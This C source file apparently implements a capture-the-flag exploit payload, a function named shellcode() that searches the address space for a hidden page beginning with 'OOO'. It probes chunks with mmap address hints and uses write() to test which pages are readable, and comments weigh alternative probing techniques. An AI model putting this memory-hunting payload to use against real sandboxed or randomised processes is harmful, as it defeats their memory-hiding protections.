#include <sys/mman.h>
#include <err.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>


// TODO: keep in sync
#define ADDR_MIN   0x0000100000000000UL  // Low-ish
#define ADDR_MASK  0x00000ffffffff000UL  // Page-aligns
//#define ADDR_MIN   0x0000010000000000UL  // Low-ish
//#define ADDR_MASK  0x000000fffffff000UL  // Page-aligns


#define chunk_size  4 * 4096UL * 4096UL  /* Note: internal mincore buf is 4096*4096 */
#define nchunks     (ADDR_MIN+ADDR_MASK) / (chunk_size)

#ifdef NDEBUG
#define DBG(...) (void)0
#else
#define DBG(...) fprintf(stderr, __VA_ARGS__)
#endif



static int check_page(uintptr_t addr)
{
    const char *p = (const char *) addr;
    if (p[0] == 'O' && p[1] == 'O' && p[2] == 'O') // Header check
    {
        DBG("\n\nFOUND IT! addr = %p, content = %s\n", p, p);
        printf("\n\nFOUND IT! addr = %p, content = %s\n", p, p);
        return 1;
    }
    return 0;
}


static void *check_chunk(uintptr_t start)
{
    if (start == 0) // 0-page prot
        return 0;

    // Solutions
    //   1.  MAP_FIXED_NOREPLACE   easiest, but kernel 4.17+
    //   2.  flag merging (original rw, ask r only, check perm with read()
    //       How reliable is this? How large/small can the chunk be?
    //   3.  No MAP_FIXED, see if hint respected or not, then use write() to find exact page
    //       How reliable? In which areas will it work?

    //DBG(". 0x%lx .. 0x%lx\n", start, start+chunk_size-1);
    //system("cat /proc/$PPID/maps >/tmp/before");
    errno = 0;
    uintptr_t pg = (uintptr_t) mmap((void*)start, chunk_size,
            PROT_READ, // Original has read+write, we only want read...
            MAP_ANONYMOUS | MAP_PRIVATE,
            -1, 0);
    //system("cat /proc/$PPID/maps >/tmp/after && diff /tmp/before /tmp/after");
    if (pg == (uintptr_t)MAP_FAILED)
    {
        if (errno == EPERM) {
            DBG("Ignoring EPERM on 0x%16lx .. 0x%16lx\n", start, start+chunk_size-1);
            return 0;
        }
        DBG("UNEXPECTED MAP_FAILED (errno=%d): 0x%16lx .. 0x%16lx\n", errno, start, start+chunk_size-1);
    }
    if (pg != start)
    {
        DBG("Found a candidate: mmap(%lx) gave %lx instead. Scanning...\n", start, (uintptr_t)pg);
        for (uintptr_t addr = start; addr < (start+chunk_size); addr += 4096) {
            DBG("Checking page at %#lx...\r", addr);
            if (write(1, (void*) addr, 10) == 10) {
                //DBG(" Could write(1) == can read mem from %p. Checking what's inside...\n", (void*) addr);
                if (check_page(addr))
                    return (void*) addr;
                else DBG("Nope, that was a red herring (%#lx)\n", addr);
            } //else warn("Could not write(1), prob. no mem at %p", addr);
        }
    }
    munmap((void*)pg, chunk_size);
    return 0;
}


void *shellcode()
{
    DBG("---- mmap hint/nohint solution  ----\n");
    DBG("Searching %zu chunks, each %lu MB (%lu MB = %lu GB total)\n",
        nchunks, chunk_size/1024/1024,
        chunk_size/1024/1024*nchunks,
        chunk_size/1024/1024*nchunks/1024);
    void *ret = NULL;
    uintptr_t start = ADDR_MIN;
    for (size_t i = 1; i <= nchunks; i++) {
        DBG("Scanning chunk %3zu/%3zu [0x%16lx .. 0x%16lx)\r", i, nchunks, start, start+chunk_size);
        void *tmp;
        if ((tmp = check_chunk(start)))
            ret = tmp; // Could just return it, but let's see the worst case.
        start += chunk_size;
    }
    return ret;
}




/*
 * mincore: need small chunks (mlock?)
 *
static int check_chunk(uintptr_t start)
{
#   define mincore_len ((chunk_size)+4095) / 4096
    // for mincore need contiguous, even small chunk and valid starting addr not enough
    uint8_t vec[mincore_len] = {0};
    mincore((void*)start, chunk_size, vec);
    for (size_t i = 0; i < mincore_len; i++) {
        if (vec[i] & 1) {
            uintptr_t pg = start + (i*4096);
            fprintf(stderr, "Candidate page %zu/chunk, start = 0x%16lx\n", i, pg);
            if (check_page(pg))
                return 1;
        }
    }
    return 0;
}
*/
